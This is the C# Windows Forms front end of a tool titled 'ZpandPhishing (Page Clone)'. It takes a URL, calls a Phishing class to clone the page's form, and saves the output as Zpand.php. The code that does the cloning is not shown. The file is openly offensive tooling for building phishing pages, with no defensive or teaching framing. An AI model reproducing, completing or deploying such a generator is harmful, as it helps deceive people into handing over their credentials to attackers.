using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Phishing
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

        }



        private void Form1_Load(object sender, EventArgs e)
        {
            this.Text = "ZpandPhishing(Page Clone) -------------------- Waking Team";
            this.button1.Text = "generate";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            
            Phishing ph = new Phishing() { url = textBox1.Text, Datatype = "noob" };

            string result = ph.Gen();
            if (result != "no Form Detected")
            {
                string path = Application.StartupPath ;
                string fileName = @"\Zpand.php";
                textBox2.Text = result;

                File.WriteAllText(path + fileName, result);
                MessageBox.Show("the file saved as Zpand.php" + Environment.NewLine + "文件己储存 ,命名为Zpand.php" +
                                Environment.NewLine + path + fileName);
                Process.Start("explorer.exe", path);
            }
            else
            {
                MessageBox.Show("Fail , no Form Detected");
            }




        }




    }
}

